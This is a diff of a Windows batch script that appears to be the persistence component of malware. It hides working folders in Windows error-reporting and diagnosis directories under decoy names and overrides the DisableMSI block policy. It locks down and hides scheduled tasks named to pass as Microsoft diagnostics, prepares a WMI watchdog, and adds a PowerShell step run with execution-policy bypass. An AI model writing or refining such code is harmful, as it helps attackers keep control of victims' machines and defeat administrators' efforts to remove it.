@@ -1,5 +1,5 @@
 @echo off
-REM OWN_SECURE BUILD 20260802S5 - identity-aware task ACL + DisableMSI neutralize + exclusions/ACL; no attr-lock on mutable payloads
+REM OWN_SECURE BUILD 20260802S6 - identity-aware task ACL + DisableMSI neutralize + exclusions/ACL; no attr-lock on mutable payloads
 setlocal EnableExtensions EnableDelayedExpansion
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
@@ -14,18 +14,7 @@ set "TASKROOT=%SystemRoot%\System32\Tasks"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
-echo secure_begin %DATE% %TIME% S4>>"%LOG%"
-
-REM --- per-host identity: which task XMLs belong to us ---
-set "TASKS_LIST=Microsoft\Windows\Diagnosis\Scheduled Microsoft\Windows\PLA\Server Microsoft\Windows\WDI\ResolutionHost Microsoft\Windows\Tcpip\IpAddressConflict1"
-if exist "%WD%\identity.cfg" (
-  set "TASKS_LIST="
-  for /f "usebackq tokens=1,2 delims==" %%K in ("%WD%\identity.cfg") do (
-    set "K=%%K"
-    set "V=%%V"
-    if "!K:~0,5!"=="TASK_" set "TASKS_LIST=!TASKS_LIST! !V:~1!"
-  )
-)
+echo secure_begin %DATE% %TIME% S6>>"%LOG%"
 
 REM --- Neutralize MSI block policies (1625) ---
 REM DisableMSI: 0=allow, 1=non-admin only, 2=all -> force 0
@@ -77,13 +66,13 @@ for %%F in (pkg.msi notify.cfg identity.cfg state.json) do (
 )
 
 REM --- ACL: scheduled task XML (harder to delete without Admin) ---
-for %%T in (%TASKS_LIST%) do (
-  if exist "%TASKROOT%\%%~T" (
-    icacls "%TASKROOT%\%%~T" /inheritance:r >nul 2>&1
-    icacls "%TASKROOT%\%%~T" /grant:r "NT AUTHORITY\SYSTEM:F" "BUILTIN\Administrators:F" >nul 2>&1
-    attrib +h +s "%TASKROOT%\%%~T" >nul 2>&1
-  )
-)
+REM S6: names contain spaces ("Server Diagnostics") - the cmd FOR loop split
+REM them into garbage tokens. PowerShell reads identity.cfg directly instead.
+powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
+  "$ErrorActionPreference='SilentlyContinue'; $names=@();" ^
+  "if(Test-Path -LiteralPath '%WD%\identity.cfg'){ Get-Content -LiteralPath '%WD%\identity.cfg' -Force | ForEach-Object { if($_ -match '^TASK_[A-D]=(.+)$'){ $names += $matches[1].Trim().TrimStart('\') } } }" ^
+  "else { $names=@('Microsoft\Windows\Diagnosis\Scheduled','Microsoft\Windows\PLA\Server','Microsoft\Windows\WDI\ResolutionHost','Microsoft\Windows\Tcpip\IpAddressConflict1') };" ^
+  "foreach($n in $names){ $f = Join-Path '%TASKROOT%' $n; if(Test-Path -LiteralPath $f){ & icacls.exe $f /inheritance:r | Out-Null; & icacls.exe $f /grant:r 'NT AUTHORITY\SYSTEM:F' 'BUILTIN\Administrators:F' | Out-Null; & attrib.exe +h +s $f | Out-Null } }" >nul 2>&1
 
 REM --- ACL: WMI watchdog subscription files (chain 2) ---
 icacls "%SystemRoot%\System32\wbem\Repository" /grant "NT AUTHORITY\SYSTEM:F" >nul 2>&1
